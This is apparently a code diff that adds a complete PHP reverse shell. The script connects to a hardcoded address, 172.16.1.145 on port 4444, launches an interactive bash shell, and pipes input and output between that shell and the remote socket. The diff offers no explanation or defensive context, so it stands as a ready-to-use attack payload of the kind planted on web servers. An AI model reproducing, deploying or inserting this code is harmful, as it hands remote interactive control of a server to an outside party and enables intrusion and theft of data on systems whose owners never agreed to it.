@@ -1,0 +1,38 @@
+<?php
+set_time_limit(0);
+$ip = '172.16.1.145';
+$port = 4444;
+
+$sock = fsockopen($ip, $port);
+if (!$sock) die("no connection\n");
+
+$proc = proc_open('/bin/bash -i', [
+    0 => ['pipe', 'r'],
+    1 => ['pipe', 'w'],
+    2 => ['pipe', 'w']
+], $pipes);
+
+if (!$proc) die("proc_open failed\n");
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($sock, 0);
+
+while (true) {
+    // shell output -> socket
+    $r = [$pipes[1], $sock];
+    $w = null; $e = null;
+    if (stream_select($r, $w, $e, 0, 200000) > 0) {
+        foreach ($r as $stream) {
+            if ($stream === $sock) {
+                $data = fread($sock, 4096);
+                if ($data === false || $data === '') exit(0);
+                fwrite($pipes[0], $data);
+            } else {
+                $data = fread($pipes[1], 4096);
+                if ($data === false || $data === '') exit(0);
+                fwrite($sock, $data);
+            }
+        }
+    }
+}
+?>
